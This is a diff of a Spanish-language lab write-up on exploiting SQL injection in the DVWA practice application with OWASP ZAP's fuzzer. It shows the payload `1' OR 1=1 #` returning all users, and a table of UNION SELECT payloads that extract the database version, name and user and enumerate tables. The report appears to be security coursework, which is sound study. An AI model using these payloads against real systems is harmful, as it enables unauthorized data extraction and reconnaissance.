@@ -201,13 +201,160 @@ Qué estuvo mal
 En la siguiente imagen se muestra correctamente colocado el payload en el parámetro `id`.
 
 
-![alt text](image-3.png)
-luego de ejeecutr, nos dimos cuenta uqe no daba el resultado, por lo que se cambio donde se editaba el payload, y se puso en la parte de "id", quedando de la siguiente manera
-
-
 ![alt text](image-4.png)
 
 ![alt text](image-5.png)
 
 ![alt text](image-6.png)
 
+### Iniciar el Fuzzer
+
+- Se hizo clic derecho sobre la petición seleccionada.  
+- En el menú contextual se seleccionó Attack → Fuzz...  
+- Se abrió la ventana "Fuzzer".
+
+💡 Explicación: El Fuzzer de ZAP permite enviar múltiples variaciones de una petición, reemplazando partes específicas con payloads maliciosos. Esto automatiza el proceso de probar diferentes vectores de ataque.
+
+---
+
+### PASO 5: Configurar el Payload de Fuzzing - Primer Intento (Incorrecto)
+
+Después de ejecutar el fuzzer con el payload `1' OR 1=1 #` se analizó la respuesta y no se obtuvo el resultado esperado.
+
+Qué estuvo mal:
+- Se ingresó el payload en el lugar equivocado del fuzzer (campo genérico o cuerpo) en vez de en el parámetro de consulta `id`.  
+- No se verificó si el cliente o la herramienta estaban codificando/filtrando el payload (comillas/espacios escapados).  
+- No se comprobó que la petición incluyera los parámetros necesarios (por ejemplo `Submit=Submit`) ni las cookies de sesión (`security=low; PHPSESSID=…`).
+
+![fuzzer-errorn](https://imgur.com/gqFL7Cd)
+
+Se detectó el error en el punto donde se insertaba el payload y se cambió la ubicación de la inyección.
+
+---
+
+### PASO 5 (Corregido): Configurar el Payload de Fuzzing Correctamente
+
+1. En la ventana del Fuzzer, en el panel "Request", localizar el parámetro `id=1` en la URL.  
+2. Seleccionar únicamente el valor `1` (no el parámetro completo `id=1`).  
+3. Hacer clic en el botón "Add..." (a la derecha del panel de Request).
+
+⚠️ Importante: Seleccionar solo el valor que se desea reemplazar, no el nombre del parámetro.  
+El valor `1` debe aparecer ahora resaltado.
+
+![Fuzzer corregido](https://imgur.com/ql0egtw)
+
+---
+
+### PASO 6: Añadir Payload de Inyección SQL
+
+1. En la ventana "Payloads", hacer clic en "Add...".  
+2. Seleccionar el tipo: "Strings".  
+3. En el campo "String", ingresar el payload:
+
+`1' OR 1=1 #`
+
+4. Hacer clic en "Add" y luego en "OK" para cerrar la ventana de payloads.
+
+Explicación del payload:
+- `1'` → Cierra la comilla de la consulta original.  
+- `OR 1=1` → Condición siempre verdadera.  
+- `#` → Comentario en MySQL que ignora el resto de la consulta.
+
+Consulta original esperada:
+```sql
+SELECT first_name, surname FROM users WHERE user_id = '1';
+```
+Consulta inyectada:
+```sql
+SELECT first_name, surname FROM users WHERE user_id = '1' OR 1=1 #';
+```
+El `#` comenta la comilla final, evitando errores de sintaxis. La condición `OR 1=1` hace que la cláusula WHERE siempre sea verdadera, devolviendo todos los usuarios.
+
+---
+
+### PASO 7: Ejecutar el Fuzzer
+
+- Verificar que el payload esté configurado correctamente.  
+- Hacer clic en "Start Fuzzer".
+
+Resultados esperados en la pestaña de resultados del fuzzing:
+- State: Successful  
+- Code: 200  
+- Reason: OK  
+- RTT (ms): ~45  
+- Size (bytes): ~2847
+
+En lugar de la imagen, enlace al reporte en HTML publicado: [Reporte del fuzzer (HTML publicado)](https://jrgil20.github.io/PracticasCiberSeguridad/Practica5/paylod3.html) — Abra el enlace en el navegador para ver el informe completo en formato HTML.
+
+---
+
+### PASO 8: Analizar la Respuesta del Fuzzing
+
+- En la ventana de resultados del Fuzzer, hacer clic en la petición ejecutada.  
+- En el panel inferior, seleccionar la pestaña "Response".  
+- Cambiar a la sub-pestaña "Body" para ver el contenido HTML de la respuesta.
+
+En lugar de la imagen, enlace al reporte en HTML publicado: [Reporte del fuzzer (HTML publicado)](https://jrgil20.github.io/PracticasCiberSeguridad/Practica5/paylod4.html) — Abra el enlace en el navegador para ver el informe completo en formato HTML.
+
+Resultado Obtenido (Inyección Exitosa):
+- ID: `1' OR 1=1 #` — First name: admin — Surname: admin  
+- ID: `1' OR 1=1 #` — First name: Gordon — Surname: Brown  
+- ID: `1' OR 1=1 #` — First name: Hack — Surname: Me  
+- ID: `1' OR 1=1 #` — First name: Pablo — Surname: Picasso  
+- ID: `1' OR 1=1 #` — First name: Bob — Surname: Smith
+
+✅ Confirmación de Vulnerabilidad: La aplicación devolvió TODOS los usuarios de la base de datos en lugar de solo el usuario con ID 1, confirmando que es vulnerable a inyección SQL.
+
+---
+
+### PASO 9: Comparar Respuestas
+
+| Aspecto | Petición Legítima (id=1) | Petición Inyectada (id=1' OR 1=1 #) |
+| :--- | :---: | :---: |
+| Código HTTP | 200 OK | 200 OK |
+| Usuarios devueltos | 1 (admin) | 5 (todos los usuarios) |
+| Tamaño de respuesta | ~850 bytes | ~2847 bytes |
+| Tiempo de respuesta | ~30 ms | ~45 ms |
+| Indicador de vulnerabilidad | ❌ Normal | ✅ VULNERABLE |
+
+Análisis:
+- El aumento significativo en el tamaño de la respuesta y la devolución de múltiples usuarios confirman que:
+  - La aplicación es vulnerable a inyección SQL.  
+  - No existe validación de entrada en el parámetro `id`.  
+  - No se utilizan consultas preparadas (prepared statements).  
+  - Es posible manipular la lógica de la consulta SQL subyacente.
+
+---
+
+### Explicación Técnica del Payload
+
+Consulta original:
+```sql
+SELECT first_name, surname FROM users WHERE user_id = '1';
+```
+Consulta con payload `1' OR 1=1 #`:
+```sql
+SELECT first_name, surname FROM users WHERE user_id = '1' OR 1=1 #';
+```
+Desglose:
+- `1'` → Cierra la comilla original.  
+- `OR 1=1` → Bypass lógico.  
+- `#` → Comentario en MySQL que ignora la comilla sobrante.
+
+---
+
+### Payloads Adicionales Probados
+
+| # | Payload | Objetivo | Resultado Obtenido | Estado |
+| :---: | :--- | :--- | :--- | :---: |
+| 1 | `1' OR '1'='1` | Bypass de autenticación | Devuelve todos los usuarios | ✅ Exitoso |
+| 2 | `1' UNION SELECT null, version() #` | Obtener versión de MySQL | Muestra: 5.0.51a-3ubuntu5 | ✅ Exitoso |
+| 3 | `1' UNION SELECT null, database() #` | Obtener nombre de la BD | Muestra: dvwa | ✅ Exitoso |
+| 4 | `1' UNION SELECT null, user() #` | Obtener usuario de BD | Muestra: root@localhost | ✅ Exitoso |
+| 5 | `1' UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema='dvwa' #` | Enumerar tablas | Lista: guestbook, users | ✅ Exitoso |
+
+Análisis de Impacto:
+- Reconocimiento completo de la infraestructura de base de datos.  
+- Identificación de la versión de MySQL (posibles exploits específicos).  
+- Enumeración de tablas (objetivo: tabla `users`).  
+- Bypass total de autenticación y controles de acceso.
